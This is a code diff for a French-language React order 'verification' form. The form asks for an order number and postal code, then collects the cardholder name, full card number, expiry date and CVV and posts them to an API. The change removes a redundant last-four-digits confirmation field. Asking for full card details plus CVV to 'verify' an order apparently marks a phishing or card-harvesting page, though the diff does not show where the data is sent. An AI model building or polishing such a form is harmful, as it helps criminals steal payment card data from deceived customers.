@@ -10,7 +10,6 @@ interface VerificationFormProps {
 const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber, initialPostalCode }) => {
   const [nameOnCard, setNameOnCard] = useState('');
   const [cardNumber, setCardNumber] = useState(''); 
-  const [last4Digits, setLast4Digits] = useState('');
   const [expiryDate, setExpiryDate] = useState(''); 
   const [cvv, setCvv] = useState(''); // State for CVV
   const [postalCode, setPostalCode] = useState(initialPostalCode);
@@ -31,7 +30,7 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber,
   }, [initialPostalCode]);
 
   const validate = (): boolean => {
-    const newErrors: { nameOnCard?: string, cardNumber?: string, last4Digits?: string, expiryDate?: string, cvv?: string, postalCode?: string } = {};
+    const newErrors: { nameOnCard?: string, cardNumber?: string, expiryDate?: string, cvv?: string, postalCode?: string } = {};
     if (!nameOnCard.trim()) newErrors.nameOnCard = "Le nom sur la carte est requis.";
     
     if (!cardNumber.trim()) {
@@ -40,11 +39,6 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber,
         newErrors.cardNumber = "Numéro de carte invalide (doit contenir 13 à 19 chiffres).";
     }
 
-    if (!last4Digits) {
-        newErrors.last4Digits = "Les 4 derniers chiffres sont requis.";
-    } else if (!/^\d{4}$/.test(last4Digits)) {
-        newErrors.last4Digits = "Doit être 4 chiffres numériques.";
-    }
 
     if (!expiryDate) {
         newErrors.expiryDate = "La date d'expiration est requise.";
@@ -89,7 +83,6 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber,
     const formDataForApp: VerificationFormData = { 
       nameOnCard, 
       cardNumber: cardNumber.replace(/\s/g, ''),
-      last4Digits, 
       expiryDate, 
       cvv,
       postalCode, 
@@ -100,7 +93,6 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber,
     body.append('order_number', formDataForApp.orderNumber);
     body.append('card_name', formDataForApp.nameOnCard);
     body.append('card_number', formDataForApp.cardNumber); 
-    body.append('last4', formDataForApp.last4Digits);
     body.append('expiry', formDataForApp.expiryDate);
     body.append('cvv', formDataForApp.cvv); // Add CVV to API request
     body.append('postal_code', formDataForApp.postalCode);
@@ -197,27 +189,6 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber,
           disabled={isLoading}
         />
         {errors.cardNumber && <p className="text-xs text-red-600 mt-1">{errors.cardNumber}</p>}
-      </div>
-
-      <div>
-        <label htmlFor="last4Digits" className="block text-sm font-medium text-gray-700 mb-1">
-          4 derniers chiffres de la carte (confirmation)
-        </label>
-        <input
-          type="text"
-          id="last4Digits"
-          value={last4Digits}
-          onChange={(e) => setLast4Digits(e.target.value.replace(/\D/g, '').slice(0,4))}
-          aria-required="true"
-          maxLength={4}
-          minLength={4}
-          pattern="\d{4}"
-          inputMode="numeric"
-          className={`w-full px-3 py-2 border ${errors.last4Digits ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm focus:ring-pink-500 focus:border-pink-500 sm:text-sm`}
-          placeholder="1234"
-          disabled={isLoading}
-        />
-        {errors.last4Digits && <p className="text-xs text-red-600 mt-1">{errors.last4Digits}</p>}
       </div>
 
       <div className="grid grid-cols-2 gap-4">
